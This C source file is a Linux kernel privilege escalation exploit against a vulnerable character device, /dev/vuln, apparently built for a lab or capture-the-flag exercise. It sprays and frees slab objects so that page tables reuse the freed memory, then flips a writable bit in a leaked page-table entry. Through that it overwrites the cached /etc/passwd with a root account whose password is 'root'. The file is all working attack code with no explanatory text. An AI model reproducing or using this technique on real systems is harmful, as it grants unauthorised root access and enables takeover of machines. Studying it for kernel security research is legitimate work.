#include <fcntl.h>      // for open, O_RDONLY, O_RDWR
#include <stdint.h>     // for uintptr_t, uint64_t
#include <stdio.h>      // for puts, size_t, NULL, perror
#include <stdlib.h>     // for exit, system, EXIT_FAILURE, EXIT_SUCCESS
#include <sys/ioctl.h>  // for ioctl
#include <sys/mman.h>   // for mmap, MAP_FAILED, MAP_FIXED_NOREPLACE, MAP_PO...
#include <sys/stat.h>   // for fstat, stat
#include <sys/types.h>  // for ssize_t
#include <unistd.h>     // for pread, sysconf, unlink, _SC_PAGESIZE

#define CMD_ALLOC	0xf000
#define CMD_READ	0xf001
#define CMD_WRITE	0xf002
#define CMD_FREE	0xf003

typedef struct {
	int id;
	size_t size;
	char *data;
} request_t;

#define objs_per_slab 8
#define cpu_partial 52
#define dev_spray (objs_per_slab * (cpu_partial + 1))
#define pagetable_spray 0x20

static uintptr_t pagetable[pagetable_spray];
static size_t page_size;
static int dev = -1;

static void fatal(const char *err)
{
	perror(err);
	exit(EXIT_FAILURE);
}

static void dev_alloc(int id)
{
	request_t req;
	req.id = id;
	req.size = 0;
	req.data = NULL;

	ioctl(dev, CMD_ALLOC, &req);
}

static void dev_read(int id, uintptr_t data, size_t len)
{
	request_t req;
	req.id = id;
	req.size = len;
	req.data = (char *)data;

	ioctl(dev, CMD_READ, &req);
}

static void dev_write(int id, uintptr_t data, size_t len)
{
	request_t req;
	req.id = id;
	req.size = len;
	req.data = (char *)data;

	ioctl(dev, CMD_WRITE, &req);
}

static void dev_free(int id)
{
	request_t req;
	req.id = id;
	req.size = 0;
	req.data = NULL;

	ioctl(dev, CMD_FREE, &req);
}

int main(void)
{
	struct stat stat_evil;
	int victim = -1;
	uint64_t pte;
	int passwd;
	int evil;

	page_size = sysconf(_SC_PAGESIZE);

	dev = open("/dev/vuln", O_RDWR);
	if (dev == -1)
		fatal("[-] open");

	for (int i = 0; i < dev_spray; ++i)
		dev_alloc(i);
	dev_alloc(dev_spray);

	for (int i = 0; i < dev_spray; i += objs_per_slab) {
		if (i % (objs_per_slab * 2) == 0) {
			for (int j = i; j < i + objs_per_slab; ++j)
				dev_free(j);
		} else {
			dev_free(i);
		}
	}

	passwd = open("/etc/passwd", O_RDONLY);
	if (passwd == -1)
		fatal("[-] open");

	for (int i = 0; i < pagetable_spray; ++i) {
		pagetable[i] = (uintptr_t)mmap(
			(void *)(0xdead0000000UL + 0x200000 * i), page_size,
			PROT_READ,
			MAP_FIXED_NOREPLACE | MAP_PRIVATE | MAP_POPULATE,
			passwd, 0);
		if ((void *)pagetable[i] == MAP_FAILED)
			fatal("[-] mmap");
	}

	for (int i = 0; i < dev_spray; ++i) {
		dev_read(i, (uintptr_t)&pte, 8);
		if (pte) {
			victim = i;
			pte |= 0x02;
			dev_write(i, (uintptr_t)&pte, 8);
			break;
		}
	}

	if (victim == -1)
		fatal("[-] cross cache failed");

	system("echo -e 'root:$1$root$9gr5KxwuEdiI80GtIzd.U0:0:0:root:/root:/bin/sh' > /tmp/evil");
	evil = open("/tmp/evil", O_RDONLY);
	if (evil == -1)
		fatal("[-] open");

	if (fstat(evil, &stat_evil) == -1)
		fatal("[-] fstat");

	for (int i = 0; i < pagetable_spray; ++i) {
		ssize_t ret =
			pread(evil, (void *)pagetable[i], stat_evil.st_size, 0);
		if (ret > 0) {
			puts("get r00t!");
			puts("user: root\npass: root");
			break;
		}
	}

	unlink("/tmp/evil");
	return EXIT_SUCCESS;
}
